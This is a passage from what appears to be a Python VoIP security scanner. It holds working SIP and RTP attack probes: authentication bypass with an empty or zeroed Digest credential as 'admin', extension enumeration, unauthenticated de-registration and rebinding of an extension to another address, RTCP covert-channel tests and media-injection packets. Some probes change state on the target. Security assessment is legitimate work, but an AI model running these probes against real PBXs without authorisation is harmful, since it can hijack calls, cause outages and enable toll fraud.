                f'active call by sending RTP with SSRC=0: the endpoint will '
                f'not correlate it with any negotiated stream but may still '
                f'forward the audio frames to the codec, enabling arbitrary '
                f'media injection and stream multiplexing without knowledge '
                f'of the SDP-negotiated SSRC. Analogous to process injection '
                f'via an unguarded handle (PMA ch12: OpenProcess + '
                f'WriteProcessMemory without SSRC-equivalent identifier; '
                f'RFC 3550 §8).'
            ),
            'host': host,
            'port': rtp_port,
        })

    # ------------------------------------------------------------------
    # Probe 3: RTCP APP packet with custom name "HACK"
    # RFC 3550 §6.7: RTCP APP (PT=204) is application-defined; the name
    # field (4 ASCII bytes) identifies the application, and the data
    # field is entirely application-specific with no size or content
    # constraint. No standard RTCP receiver validates the APP name field.
    # RTCP APP packets traverse the media control port (RTP+1 by RFC
    # 3550 §11 convention) and are invisible to SIP-aware firewalls.
    # PMA ch14 (protocol field tunneling): data embedded in a field the
    # DPI engine does not inspect (RTCP APP name + data = the application-
    # defined "User-Agent" equivalent on the media control plane).
    # ------------------------------------------------------------------
    rtcp_port = rtp_port + 1
    app_name = b'HACK'                              # 4-byte name, RFC 3550 §6.7
    app_data = b'covert-channel-probe\x00\x00\x00\x00'   # 24 bytes, 32-bit aligned
    # RTCP fixed common header: V/P/subtype(1B) + PT(1B) + length(2B) = 4B
    # RTCP APP: common(4B) + SSRC(4B) + name(4B) + data(NB)
    total_bytes = 4 + 4 + 4 + len(app_data)        # = 36 bytes
    rtcp_length = (total_bytes // 4) - 1            # = 8 (length in 32-bit words - 1)
    rtcp_b0 = 0x80   # V=2, P=0, subtype=0
    rtcp_b1 = 204    # RTCP APP PT
    rtcp_pkt = _struct.pack('!BBH', rtcp_b0, rtcp_b1, rtcp_length)
    rtcp_pkt += _struct.pack('!I', 0xABCD1234)      # SSRC
    rtcp_pkt += app_name
    rtcp_pkt += app_data

    resp3 = _udp_send_recv((host, rtcp_port), rtcp_pkt)
    if resp3 and len(resp3) >= 4:
        findings.append({
            'severity': 'HIGH',
            'title': 'RTCP_APP_COVERT_CHANNEL',
            'detail': (
                f'UDP {host}:{rtcp_port} responded to an RTCP APP packet '
                f'(PT=204) with name="HACK". RFC 3550 §6.7 defines the APP '
                f'packet for application-specific RTCP extensions; the name '
                f'and application-defined data fields carry arbitrary content '
                f'with no registry or validation requirement. The server '
                f'replied without filtering on the APP name. RTCP APP packets '
                f'on the media control port (RTP+1) bypass SIP-signaling '
                f'content inspection entirely: they are not SIP, are not '
                f'correlated with a specific call leg by most SBCs, and carry '
                f'an unrestricted data field up to the UDP MTU. An attacker '
                f'uses RTCP APP on an established media port as a '
                f'bidirectional covert channel, tunneling C2 traffic in RTCP '
                f'frames that appear as legitimate media quality reports to '
                f'any device inspecting only the PT field. Direct analogy to '
                f'protocol field tunneling (PMA ch14: data in DNS name fields, '
                f'HTTP User-Agent; RTCP APP data field is the media-plane '
                f'equivalent; RFC 3550 §6.7).'
            ),
            'host': host,
            'port': rtcp_port,
        })

    # ------------------------------------------------------------------
    # Probe 4: Oversized RTP packet (>1500 bytes MTU)
    # Standard Ethernet MTU = 1500 bytes; RTP audio payloads are 160-320
    # bytes (G.711 20ms). A path that accepts RTP frames >1500 bytes
    # without requiring IP fragmentation (OSError EMSGSIZE) supports
    # jumbo frames (up to 9000 bytes on GigE) or silently fragments.
    # Either condition allows high-bandwidth covert exfiltration: each
    # "audio" packet carries up to ~8988 bytes of payload vs. ~160 bytes
    # for normal voice — a 56x throughput increase on the covert channel.
    # PMA ch13 (encoding algorithms that maximize data density): custom
    # encoding packed into a larger-than-expected field is the classical
    # technique for increasing covert-channel capacity. Absence of
    # OSError = packet accepted by local network stack without MTU reject.
    # ------------------------------------------------------------------
    jumbo_rtp = (_rtp_header(0, seq_base + 2, ts_base + 320, 0xCAFEBABE)
                 + _os.urandom(1500))    # 12 + 1500 = 1512 bytes, exceeds standard MTU
    jumbo_path_ok = False
    try:
        js = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        js.settimeout(timeout)
        js.sendto(jumbo_rtp, (host, rtp_port))
        jumbo_path_ok = True
        try:
            js.recvfrom(4096)
        except socket.timeout:
            pass
        js.close()
    except OSError:
        pass   # EMSGSIZE or similar = local MTU rejects packet; not a finding

    if jumbo_path_ok:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'RTP_JUMBO_FRAME_PATH',
            'detail': (
                f'UDP {host}:{rtp_port} accepted an oversized RTP packet '
                f'({len(jumbo_rtp)} bytes, exceeding standard 1500-byte '
                f'Ethernet MTU) without triggering an ICMP Fragmentation '
                f'Needed / local EMSGSIZE rejection. The network path '
                f'accepts packets larger than standard MTU (jumbo frames '
                f'up to 9000 bytes on GigE links, or silent IP '
                f'fragmentation). Standard RTP audio payloads are 160-320 '
                f'bytes (G.711 20ms); a jumbo-capable path allows an '
                f'attacker to encode up to 8988 bytes of covert payload per '
                f'RTP frame — a 56x throughput increase over the voice '
                f'baseline. High-payload-density encoding is the classical '
                f'malware data-exfiltration optimization: pack more data '
                f'into each protocol unit to maximize channel capacity '
                f'(PMA ch13: encoding algorithms that maximize density; '
                f'RFC 3550 §5.1; RFC 4821 PMTUD blackhole detection).'
            ),
            'host': host,
            'port': rtp_port,
        })

    return findings

    return findings


# ---------------------------------------------------------------------------
# Authentication bypass surface (ch04 differential, ch13 default creds)
# ---------------------------------------------------------------------------

def probe_sip_authentication_bypass(host: str, port: int = 5060,
                                    timeout: float = 10.0) -> list:
    """Probe SIP service for authentication bypass conditions.

    Probes:
      - REGISTER with empty Authorization header -> 200 = credentials not checked
      - INVITE with anonymous From (no display name) -> 200/100 instead of 401
      - REGISTER with zeroed Digest response hash -> 200 = hash not validated
      - Proxy-Authenticate vs WWW-Authenticate in challenge -> endpoint missing auth

    Grounded in Hacking Exposed UC&VoIP ch04 (differential response analysis:
    200 OK on REGISTER without valid credentials = direct registration bypass)
    and ch13 (Cisco UCM/CME default credential surfaces; Asterisk admin:admin
    AMI; digest validation absent on misconfigured Kamailio/OpenSIPS deployments
    where realm matching is skipped).  RFC 3261 §22.2 requires endpoints to
    issue 401 with WWW-Authenticate on first REGISTER; a 200 without prior
    challenge is a protocol violation and a CRITICAL bypass.

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re
    findings = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: REGISTER with syntactically present but empty Authorization
    # RFC 3261 §20.7: Authorization header must contain credentials.
    # A parser that sees the header name and skips credential validation
    # will issue 200 OK instead of 401/403.
    # ------------------------------------------------------------------
    br1 = _branch()
    cid1 = _call_id(host)
    tag1 = _tag()
    reg_empty_auth = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br1}',
        'Max-Forwards: 70',
        f'From: <sip:scanner@{local_ip}>;tag={tag1}',
        f'To: <sip:scanner@{host}>',
        f'Call-ID: {cid1}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:scanner@{local_ip}:5060>',
        'Authorization: ',
        'Expires: 3600',
        'Content-Length: 0',
        '',
        '',
    ])
    resp1 = _send_udp_sip(host, port, reg_empty_auth, timeout)
    code1 = _parse_status_code(resp1)
    if code1 == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_AUTH_BYPASS',
            'detail': (
                f'{host}:{port} returned 200 OK to a SIP REGISTER containing '
                f'an empty Authorization header (no credential parameters). '
                f'RFC 3261 §22.2 requires a 401 Unauthorized challenge before '
                f'accepting registration; a 200 without prior challenge means '
                f'the server registered the endpoint without verifying any '
                f'credential. Any SIP UA can register arbitrary extensions and '
                f'intercept inbound calls, redirect calls, or impersonate '
                f'internal extensions. Differential analysis reference: '
                f'Hacking Exposed UC&VoIP ch04.'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: INVITE with anonymous From (no display name, no user part)
    # Legitimate INVITEs carry From: "Display Name" <sip:user@domain>.
    # An anonymous From: <sip:anonymous@anonymous.invalid> tests whether
    # the server challenges the caller identity before allowing call setup.
    # 100 Trying or 200 OK without prior 401 = call setup without auth.
    # ------------------------------------------------------------------
    br2 = _branch()
    cid2 = _call_id(host)
    tag2 = _tag()
    sdp_anon = (
        'v=0\r\n'
        f'o=- 0 0 IN IP4 {local_ip}\r\n'
        's=-\r\n'
        f'c=IN IP4 {local_ip}\r\n'
        't=0 0\r\n'
        f'm=audio 49172 RTP/AVP 0\r\n'
        'a=rtpmap:0 PCMU/8000\r\n'
    )
    sdp_len = len(sdp_anon.encode('utf-8'))
    invite_anon = '\r\n'.join([
        f'INVITE sip:100@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
        'Max-Forwards: 70',
        f'From: <sip:anonymous@anonymous.invalid>;tag={tag2}',
        f'To: <sip:100@{host}>',
        f'Call-ID: {cid2}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:anonymous@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {sdp_len}',
        '',
        sdp_anon,
    ])
    resp2 = _send_udp_sip(host, port, invite_anon, timeout)
    code2 = _parse_status_code(resp2)
    if code2 in (100, 200, 183):
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_UNAUTH_INVITE',
            'detail': (
                f'{host}:{port} returned {code2} to a SIP INVITE with an '
                f'anonymous From: <sip:anonymous@anonymous.invalid> without '
                f'issuing a 401/407 authentication challenge first. RFC 3261 '
                f'§22.1 allows servers to challenge INVITE; a proceeding '
                f'response (100/183/200) without challenge permits unauthenticated '
                f'call setup from any SIP UA. Attacker can initiate calls, '
                f'consume PSTN resources, and trigger toll fraud. Reference: '
                f'Hacking Exposed UC&VoIP ch04 differential analysis; ch07 '
                f'TDoS (half-open INVITE without ACK for resource exhaustion).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: REGISTER with zeroed Digest response hash
    # RFC 2617 §3.2.2: response = MD5(H(A1):nonce:H(A2)).
    # A server that accepts response="00000000000000000000000000000000"
    # is not validating the hash computation — the Digest scheme is
    # decorative. Applies to Asterisk deployments where peer authentication
    # is disabled or realm matching is skipped (ch13 default config).
    # ------------------------------------------------------------------
    br3 = _branch()
    cid3 = _call_id(host)
    tag3 = _tag()
    reg_zeroed = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:admin@{host}>;tag={tag3}',
        f'To: <sip:admin@{host}>',
        f'Call-ID: {cid3}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:admin@{local_ip}:5060>',
        (f'Authorization: Digest username="admin",realm="asterisk",'
         f'nonce="0",uri="sip:{host}",algorithm=MD5,'
         f'response="00000000000000000000000000000000"'),
        'Expires: 3600',
        'Content-Length: 0',
        '',
        '',
    ])
    resp3 = _send_udp_sip(host, port, reg_zeroed, timeout)
    code3 = _parse_status_code(resp3)
    if code3 == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_DIGEST_BYPASS',
            'detail': (
                f'{host}:{port} returned 200 OK to a SIP REGISTER with '
                f'Authorization: Digest response="00000000000000000000000000000000" '
                f'(32 zero-hex MD5 hash). RFC 2617 §3.2.2 requires the server to '
                f'recompute H(A1):nonce:H(A2) and compare; acceptance of the '
                f'zeroed hash means digest validation is absent or bypassed. '
                f'Attacker registers as "admin" on the Asterisk realm without '
                f'knowing any credential. Full PBX takeover path: register admin '
                f'extension -> redirect inbound calls -> toll fraud -> eavesdrop. '
                f'Reference: Hacking Exposed UC&VoIP ch13 (Asterisk default config '
                f'surfaces); RFC 2617 §3.2.2.'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 4: Proxy-Authenticate vs WWW-Authenticate in challenge
    # RFC 3261 §22.3: UAs challenging REGISTER must use WWW-Authenticate.
    # Proxy-Authenticate (407) is for proxy-layer auth; an endpoint issuing
    # only 407 means the UA endpoint itself does not authenticate — auth
    # is delegated to the proxy, which may be absent on direct connections.
    # ------------------------------------------------------------------
    br4 = _branch()
    cid4 = _call_id(host)
    tag4 = _tag()
    reg_probe = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br4}',
        'Max-Forwards: 70',
        f'From: <sip:probe@{local_ip}>;tag={tag4}',
        f'To: <sip:probe@{host}>',
        f'Call-ID: {cid4}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:probe@{local_ip}:5060>',
        'Expires: 3600',
        'Content-Length: 0',
        '',
        '',
    ])
    resp4 = _send_udp_sip(host, port, reg_probe, timeout)
    code4 = _parse_status_code(resp4)
    has_proxy_auth = bool(_parse_header(resp4, 'Proxy-Authenticate'))
    has_www_auth = bool(_parse_header(resp4, 'WWW-Authenticate'))
    if code4 == 407 and has_proxy_auth and not has_www_auth:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SIP_PROXY_AUTH_ONLY',
            'detail': (
                f'{host}:{port} issued 407 Proxy Authentication Required with '
                f'Proxy-Authenticate but no WWW-Authenticate on a REGISTER '
                f'request. RFC 3261 §22.3 requires endpoints to challenge '
                f'REGISTER with 401/WWW-Authenticate; a 407-only response means '
                f'the endpoint relies entirely on a proxy for credential '
                f'enforcement. On direct UDP connections that bypass the proxy '
                f'(common after SBC misconfiguration or during emergency '
                f'failover), the endpoint accepts REGISTER without challenge. '
                f'Reference: RFC 3261 §22.3; Hacking Exposed UC&VoIP ch04.'
            ),
            'host': host,
            'port': port,
        })

    return findings


# ---------------------------------------------------------------------------
# Extension enumeration surface (ch04 differential, ch11 presence)
# ---------------------------------------------------------------------------

def probe_sip_enumeration(host: str, port: int = 5060,
                          timeout: float = 10.0) -> list:
    """Probe SIP service for extension enumeration surfaces.

    Probes:
      - OPTIONS to extensions 100, 200, 1000 -> 200 = extension confirmed valid
      - 404 vs 403 response differential across extensions -> valid/invalid leak
      - SUBSCRIBE for presence to each extension -> 200 = unauthenticated presence
      - Via header in response for RFC1918 internal IP disclosure

    Grounded in Hacking Exposed UC&VoIP ch04 (extension enumeration via OPTIONS
    and REGISTER differential: 401 = exists, 403 = absent on FreePBX/Trixbox;
    404 vs 403 on OPTIONS leaks valid vs invalid extension space).  OPTIONS is
    the stealthiest method: it is RFC 3261 required, and many PBX deployments
    disable logging for OPTIONS keep-alive traffic.  Presence (SUBSCRIBE/NOTIFY
    per RFC 3856) exposes call state and extension occupancy without auth on
    misconfigured Asterisk/FreeSwitch installs.  Internal IP in Via header is
    a classic SIP topology disclosure (RFC 3261 §20.42 Via records each hop;
    proxy may insert private-space address visible to external caller).

    Returns list of {severity, title, detail, host, port}.
    """
    import re as _re
    findings = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # RFC1918 address detector (for Via header leak check)
    # ------------------------------------------------------------------
    _rfc1918 = _re.compile(
        r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        r'|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}'
        r'|192\.168\.\d{1,3}\.\d{1,3})\b'
    )

    extensions = ['100', '200', '1000']
    responses = {}   # ext -> (code, raw_response)

    # ------------------------------------------------------------------
    # Probe 1 + 4 (combined): OPTIONS per extension, collect codes + Via
    # ------------------------------------------------------------------
    for ext in extensions:
        msg = _build_options(host, port, local_ip, target_extension=ext)
        resp = _send_udp_sip(host, port, msg, timeout)
        code = _parse_status_code(resp)
        responses[ext] = (code, resp)

        if code == 200:
            findings.append({
                'severity': 'HIGH',
                'title': f'SIP_EXTENSION_VALID',
                'detail': (
                    f'{host}:{port} returned 200 OK to OPTIONS sip:{ext}@{host}. '
                    f'A 200 response to OPTIONS confirms the extension exists and '
                    f'is active without requiring authentication. Extension {ext} '
                    f'can be targeted for REGISTER hijack, INVITE toll-fraud, or '
                    f'directed call interception. OPTIONS is the stealthiest '
                    f'enumeration vector: RFC 3261 requires support, and most PBX '
                    f'deployments exclude OPTIONS from audit logs (keep-alive '
                    f'suppression). Reference: Hacking Exposed UC&VoIP ch04.'
                ),
                'host': host,
                'port': port,
            })

        # Via header internal IP check (Probe 4) — run on every response
        via_val = _parse_header(resp, 'Via')
        if via_val:
            m = _rfc1918.search(via_val)
            if m:
                internal_ip = m.group(0)
                # Only report if it's not our own local_ip (avoid self-report)
                if internal_ip != local_ip:
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'SIP_INTERNAL_IP_LEAK',
                        'detail': (
                            f'{host}:{port} included RFC1918 address {internal_ip} '
                            f'in the Via header of its OPTIONS response for extension '
                            f'{ext}. The Via header records each SIP hop (RFC 3261 '
                            f'§20.42); a private-space address in Via discloses the '
                            f'internal network topology to external callers. The '
                            f'address {internal_ip} is a PBX or SBC interface on the '
                            f'private segment — an attacker uses this to map the '
                            f'internal voice VLAN, target the SBC management interface, '
                            f'or conduct SIP topology hiding bypass. Reference: '
                            f'RFC 3261 §20.42; Hacking Exposed UC&VoIP ch11.'
                        ),
                        'host': host,
                        'port': port,
                    })

    # ------------------------------------------------------------------
    # Probe 2: 404 vs 403 differential across extensions
    # FreePBX/Trixbox: 403 = extension absent, 404 = method not allowed
    # Some deployments invert this or mix codes — any asymmetry leaks
    # valid vs invalid extension boundaries.
    # ------------------------------------------------------------------
    codes_seen = {ext: responses[ext][0] for ext in extensions}
    unique_codes = set(codes_seen.values()) - {0}
    # Enumerable if we get both 403 and 404 (or 403 and 200, etc.) across exts
    if len(unique_codes) >= 2 and 200 not in unique_codes:
        code_summary = ', '.join(
            f'{ext}={codes_seen[ext]}' for ext in extensions
        )
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_EXTENSION_ENUM',
            'detail': (
                f'{host}:{port} returned different response codes for different '
                f'extensions via OPTIONS: {code_summary}. Response code '
                f'asymmetry across the extension range leaks which extensions '
                f'are valid vs invalid: an attacker sweeps the full extension '
                f'space (100-9999) and maps valid extensions by code differential. '
                f'On FreePBX/Trixbox: 403 = extension absent, 401 = extension '
                f'exists and requires auth. The resulting valid-extension map '
                f'is used for targeted REGISTER hijack and toll-fraud INVITE. '
                f'Reference: Hacking Exposed UC&VoIP ch04 (REGISTER differential '
                f'analysis; same principle applies to OPTIONS).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: SUBSCRIBE for presence (RFC 3856) without authentication
    # Presence subscription discloses whether an extension is on a call,
    # idle, or DND — real-time occupancy without any credential.
    # ------------------------------------------------------------------
    for ext in extensions:
        br_s = _branch()
        cid_s = _call_id(host)
        tag_s = _tag()
        subscribe_msg = '\r\n'.join([
            f'SUBSCRIBE sip:{ext}@{host} SIP/2.0',
            f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br_s}',
            'Max-Forwards: 70',
            f'From: <sip:watcher@{local_ip}>;tag={tag_s}',
            f'To: <sip:{ext}@{host}>',
            f'Call-ID: {cid_s}',
            'CSeq: 1 SUBSCRIBE',
            f'Contact: <sip:watcher@{local_ip}:5060>',
            'Event: presence',
            'Accept: application/pidf+xml',
            'Expires: 60',
            'Content-Length: 0',
            '',
            '',
        ])
        resp_s = _send_udp_sip(host, port, subscribe_msg, timeout)
        code_s = _parse_status_code(resp_s)
        if code_s == 200:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SIP_PRESENCE_UNAUTH',
                'detail': (
                    f'{host}:{port} returned 200 OK to an unauthenticated '
                    f'SUBSCRIBE Event: presence for extension {ext}. RFC 3856 '
                    f'presence subscriptions expose real-time call state: idle, '
                    f'on-call, DND, or unavailable. No credential was supplied; '
                    f'the server accepted the watcher subscription without a '
                    f'401/407 challenge. An external attacker can monitor '
                    f'extension occupancy for call-pattern intelligence (when '
                    f'executives are on calls, which extensions are idle during '
                    f'off-hours for social engineering), and can correlate '
                    f'presence state changes with DTMF extraction or eavesdrop '
                    f'timing. Reference: RFC 3856; Hacking Exposed UC&VoIP ch11 '
                    f'(RTP interception and media path exposure).'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_sip_registration_hijacking(host: str, port: int = 5060, timeout: float = 10.0) -> list:
    """Probe for unauthenticated SIP registration manipulation.

    Checks three surfaces:
    1. Unauth de-registration (REGISTER Expires: 0 without 401/407 challenge).
    2. Registration hijack via forged Contact pointing to attacker IP.
    3. Registered-contact disclosure in 200 OK response body.
    """
    import socket

    findings = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: Unauthenticated de-registration (Expires: 0)
    # RFC 3261 §10.2.2: a REGISTER with Expires: 0 removes the binding.
    # If the server returns 200 without a 401/407 challenge first, any
    # remote party can silently knock extensions off the network.
    # ------------------------------------------------------------------
    br1 = _branch()
    cid1 = _call_id(host)
    tag1 = _tag()
    dereg_msg = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br1}',
        'Max-Forwards: 70',
        f'From: <sip:1000@{host}>;tag={tag1}',
        f'To: <sip:1000@{host}>',
        f'Call-ID: {cid1}',
        'CSeq: 1 REGISTER',
        f'Contact: <sip:1000@{local_ip}:5060>',
        'Expires: 0',
        'Content-Length: 0',
        '',
        '',
    ])
    resp1 = _send_udp_sip(host, port, dereg_msg, timeout)
    code1 = _parse_status_code(resp1)
    if code1 == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_UNAUTH_DEREGISTER',
            'detail': (
                f'{host}:{port} returned 200 OK to an unauthenticated '
                f'REGISTER with Expires: 0 for extension 1000. RFC 3261 '
                f'§10.2.2 requires the server to challenge this request with '
                f'401 Unauthorized or 407 Proxy Authentication Required before '
                f'removing the binding. Without that challenge, any network '
                f'attacker can de-register arbitrary extensions, causing '
                f'immediate call failure (denial of service) and preventing '
                f'the legitimate UA from receiving inbound calls. This is a '
                f'prerequisite step in call-hijacking chains: de-register the '
                f'victim, then re-register the attacker-controlled UA in its '
                f'place. Reference: RFC 3261 §10; Hacking Exposed UC&VoIP '
                f'ch04 (REGISTER replay and de-registration attacks).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 2: Registration hijack via forged Contact (attacker IP)
    # Send a REGISTER for extension 1000 with a Contact URI pointing to
    # a non-local IP (simulating attacker-controlled UA). A 200 OK without
    # prior 401/407 means inbound calls for that extension will be routed
    # to the attacker's endpoint.
    # ------------------------------------------------------------------
    br2 = _branch()
    cid2 = _call_id(host)
    tag2 = _tag()
    attacker_ip = '203.0.113.99'   # TEST-NET-3, RFC 5737 — non-routable probe marker
    hijack_msg = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
        'Max-Forwards: 70',
        f'From: <sip:1000@{host}>;tag={tag2}',
        f'To: <sip:1000@{host}>',
        f'Call-ID: {cid2}',
        'CSeq: 2 REGISTER',
        f'Contact: <sip:1000@{attacker_ip}:5060>',
        'Expires: 3600',
        'Content-Length: 0',
        '',
        '',
    ])
    resp2 = _send_udp_sip(host, port, hijack_msg, timeout)
    code2 = _parse_status_code(resp2)
    if code2 == 200:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SIP_REGISTRATION_HIJACK',
            'detail': (
                f'{host}:{port} accepted a REGISTER for extension 1000 with '
                f'Contact: sip:1000@{attacker_ip}:5060 without issuing a '
                f'401/407 authentication challenge. RFC 3261 §10.3 requires '
                f'registrars to authenticate REGISTER requests before updating '
                f'location bindings. An unauthenticated binding update routes '
                f'all inbound calls for the target extension to the '
                f'attacker-controlled UA, enabling real-time call interception, '
                f'impersonation, and toll fraud. Combined with the Expires: 0 '
                f'de-registration surface (if present), this constitutes a '
                f'complete call-hijacking primitive requiring no credentials. '
                f'Reference: RFC 3261 §10; CVE-2009-3304 class; Hacking '
                f'Exposed UC&VoIP ch04 (Contact spoofing and REGISTER replay).'
            ),
            'host': host,
            'port': port,
        })

    # ------------------------------------------------------------------
    # Probe 3: Registered-contact disclosure in 200 OK response
    # Some registrars echo the full contact binding table in the 200 OK
    # body or via Contact headers. This leaks the internal UA address,
    # NAT-translated IP, and registration state of all bound contacts.
    # ------------------------------------------------------------------
    br3 = _branch()
    cid3 = _call_id(host)
    tag3 = _tag()
    query_msg = '\r\n'.join([
        f'REGISTER sip:{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br3}',
        'Max-Forwards: 70',
        f'From: <sip:1000@{host}>;tag={tag3}',
        f'To: <sip:1000@{host}>',
        f'Call-ID: {cid3}',
        'CSeq: 3 REGISTER',
        'Contact: *',
        'Expires: 0',
        'Content-Length: 0',
        '',
        '',
    ])
    resp3 = _send_udp_sip(host, port, query_msg, timeout)
    code3 = _parse_status_code(resp3)
    contact_hdr = _parse_header(resp3, 'Contact')
    if code3 == 200 and contact_hdr:
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_CONTACT_DISCLOSURE',
            'detail': (
                f'{host}:{port} returned a 200 OK containing Contact header(s) '
                f'disclosing registered UA bindings: {contact_hdr!r}. This '
                f'exposes internal IP addresses, NAT-translated endpoints, and '
                f'registration lifetimes for tracked extensions without '
                f'authentication. An attacker learns which UAs are active, '
                f'their reachable addresses for direct SIP signalling, and '
                f'registration expiry windows useful for timing hijack attempts. '
                f'Reference: RFC 3261 §10.2.8; Hacking Exposed UC&VoIP ch04 '
                f'(location-server enumeration via REGISTER).'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_sip_media_interception(host: str, port: int = 5060, timeout: float = 10.0) -> list:
    """Probe for media interception and weak media-security posture.

    Checks four surfaces:
    1. INVITE accepted with SDP offering only PCMU/G711 (no SRTP).
    2. INVITE with no SDP body accepted (late-media, RFC 3261 §13.2.1).
    3. SUBSCRIBE to dialog event package (RFC 4235) returns active call info.
    4. OPTIONS Allow header missing SAVP/SRTP capability advertisement.
    """
    import socket

    findings = []
    local_ip = _get_local_ip()

    # ------------------------------------------------------------------
    # Probe 1: INVITE with SDP offering PCMU only, no SRTP/SAVP
    # RFC 3711 defines SRTP; RFC 4568 defines SDP Security Descriptions
    # (crypto lines). If the server returns 100/180/200 to an INVITE
    # offering only RTP/AVP + PCMU without any crypto= line or SAVP
    # profile, the call path will carry unencrypted media — trivially
    # captured with tshark/Wireshark on any on-path position.
    # ------------------------------------------------------------------
    br1 = _branch()
    cid1 = _call_id(host)
    tag1 = _tag()
    sdp_body = '\r\n'.join([
        'v=0',
        f'o=- 1234567890 1234567890 IN IP4 {local_ip}',
        's= SIP Probe',
        f'c=IN IP4 {local_ip}',
        't=0 0',
        'm=audio 20000 RTP/AVP 0',
        'a=rtpmap:0 PCMU/8000',
        'a=sendrecv',
        '',
    ])
    sdp_bytes = sdp_body.encode('utf-8')
    invite_weak = '\r\n'.join([
        f'INVITE sip:1000@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br1}',
        'Max-Forwards: 70',
        f'From: <sip:probe@{local_ip}>;tag={tag1}',
        f'To: <sip:1000@{host}>',
        f'Call-ID: {cid1}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:probe@{local_ip}:5060>',
        'Content-Type: application/sdp',
        f'Content-Length: {len(sdp_bytes)}',
        '',
        sdp_body,
    ])
    resp1 = _send_udp_sip(host, port, invite_weak, timeout)
    code1 = _parse_status_code(resp1)
    # 100 Trying, 180 Ringing, or 200 OK all indicate session progress without SRTP
    if code1 in (100, 180, 183, 200):
        findings.append({
            'severity': 'HIGH',
            'title': 'SIP_NO_SRTP_OFFERED',
            'detail': (
                f'{host}:{port} responded {code1} to an INVITE carrying an '
                f'SDP offer with RTP/AVP profile (PCMU/8000) and no SRTP '
                f'crypto= lines or RTP/SAVP profile. The server did not '
                f'reject the session with 488 Not Acceptable Here, indicating '
                f'it will proceed with unencrypted media. On-path attackers '
                f'can capture RTP streams with tshark (tshark -i eth0 -d '
                f'udp.port==20000,rtp) and reconstruct audio with sox or '
                f'Wireshark\'s RTP player. RFC 3711 SRTP and RFC 4568 SDP '
                f'Security Descriptions are both absent from the negotiated '
                f'session. Reference: RFC 3711; RFC 4568; Hacking Exposed '
                f'UC&VoIP ch11 (RTP eavesdropping and media replay).'
            ),
            'host': host,
            'port': port,
        })
        # Send BYE to clean up any provisional or established dialog
        br_bye = _branch()
        bye_msg = '\r\n'.join([
            f'BYE sip:1000@{host} SIP/2.0',
            f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br_bye}',
            'Max-Forwards: 70',
            f'From: <sip:probe@{local_ip}>;tag={tag1}',
            f'To: <sip:1000@{host}>',
            f'Call-ID: {cid1}',
            'CSeq: 2 BYE',
            'Content-Length: 0',
            '',
            '',
        ])
        _send_udp_sip(host, port, bye_msg, 2.0)

    # ------------------------------------------------------------------
    # Probe 2: INVITE with no SDP body (late media / RFC 3261 §13.2.1)
    # Offer-less INVITEs defer SDP negotiation to the 200 OK / ACK
    # exchange. Servers that accept these without requiring authentication
    # expose a media interception surface: the attacker controls the SDP
    # answer timing and can inject RTP endpoints via the ACK body.
    # ------------------------------------------------------------------
    br2 = _branch()
    cid2 = _call_id(host)
    tag2 = _tag()
    invite_nosdp = '\r\n'.join([
        f'INVITE sip:1000@{host} SIP/2.0',
        f'Via: SIP/2.0/UDP {local_ip}:5060;branch={br2}',
        'Max-Forwards: 70',
        f'From: <sip:probe@{local_ip}>;tag={tag2}',
        f'To: <sip:1000@{host}>',
        f'Call-ID: {cid2}',
        'CSeq: 1 INVITE',
        f'Contact: <sip:probe@{local_ip}:5060>',
        'Content-Length: 0',
        '',
        '',
    ])
    resp2 = _send_udp_sip(host, port, invite_nosdp, timeout)
    code2 = _parse_status_code(resp2)
    if code2 in (100, 180, 183, 200):
        findings.append({
            'severity': 'MEDIUM',
